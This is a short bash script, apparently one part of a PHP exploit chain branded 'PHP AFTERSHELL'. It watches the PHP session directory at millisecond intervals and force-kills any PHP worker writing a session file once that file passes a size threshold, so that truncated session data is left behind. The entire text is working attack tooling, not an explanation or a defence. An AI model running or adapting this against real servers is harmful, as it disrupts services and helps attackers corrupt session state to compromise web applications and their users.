#!/bin/bash
# agent.sh — interrupt agent, kill worker PHP mid-write
# by Cotab1mzz
set -u

if [ -z "${NO_COLOR:-}" ]; then
  CYAN="$(printf '\033[96;1m')"
  MAGENTA="$(printf '\033[95;1m')"
  RESET="$(printf '\033[0m')"
else
  CYAN=''; MAGENTA=''; RESET=''
fi
printf '%s+--------------------------------------+%s\n' "$CYAN" "$RESET"
printf '%s|  PHP %sAFTERSHELL%s                      |%s\n' "$CYAN" "$MAGENTA" "$CYAN" "$RESET"
printf '%s+--------------------------------------+%s\n' "$CYAN" "$RESET"
printf '  by Cotab1mzz  |  interrupt agent\n\n'

THRESHOLD="${SESSION_THRESHOLD:-100000}"
POLL="${POLL_INTERVAL:-0.001}"
SESS_DIR="/var/lib/php/sessions"

echo "[agent] start threshold=${THRESHOLD} poll=${POLL}"

kill_mid_write() {
  local f="$1"
  [ -f "$f" ] || return
  local sz
  sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
  [ "$sz" -lt "$THRESHOLD" ] && return
  local pid
  # cari pid yang lagi buka file ini
  pid=$(lsof -t "$f" 2>/dev/null | head -1)
  if [ -n "${pid:-}" ]; then
    kill -9 "$pid" 2>/dev/null && echo "[agent] KILLED pid=$pid size=$sz file=$f"
  fi
}

# PAKSA mode polling
echo "[agent] mode=polling (inotify dimatikan untuk kompatibilitas Docker cross-container)"

while true; do
  for f in "$SESS_DIR"/sess_*; do
    [ -e "$f" ] || continue
    kill_mid_write "$f"
  done
  sleep "$POLL"
done
